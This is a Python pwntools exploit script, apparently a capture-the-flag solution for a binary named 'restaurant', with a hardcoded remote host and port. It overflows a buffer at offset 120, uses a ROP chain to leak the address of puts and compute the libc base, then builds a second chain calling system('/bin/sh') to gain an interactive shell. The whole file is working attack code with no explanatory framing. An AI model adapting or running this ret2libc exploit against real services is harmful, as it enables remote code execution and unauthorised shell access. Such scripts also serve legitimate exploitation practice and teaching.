#!usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './restaurant'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc6_2.27-3ubuntu1.4_amd64.so'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
host, port = '34.107.4.232', 31278 

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
break *0x40076b
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    io = initialize()
    rop = ROP(exe)

    offset = 120
    payload = flat({
        offset: [
            rop.rdi.address,
            elf.got['puts'],
            elf.plt['puts'],
            elf.sym['main']
        ]
    })
    io.sendlineafter(b'>>', b'3')
    io.sendlineafter(b':', payload)

    leak = u64(io.recvline().strip().ljust(8, b'\x00'))
    libc.address = leak - libc.sym['puts']

    offset = 120
    payload = flat({
        offset: [
            rop.rdi.address,
            next(libc.search(b'/bin/sh\x00')),
            rop.ret.address,
            libc.sym['system'],
        ]
    })
    io.sendlineafter(b'>>', b'3')
    io.sendlineafter(b':', payload)

    info('leaked puts: %#x', leak)
    info('libc base: %#x', libc.address)
    io.interactive()
    
if __name__ == '__main__':
    exploit()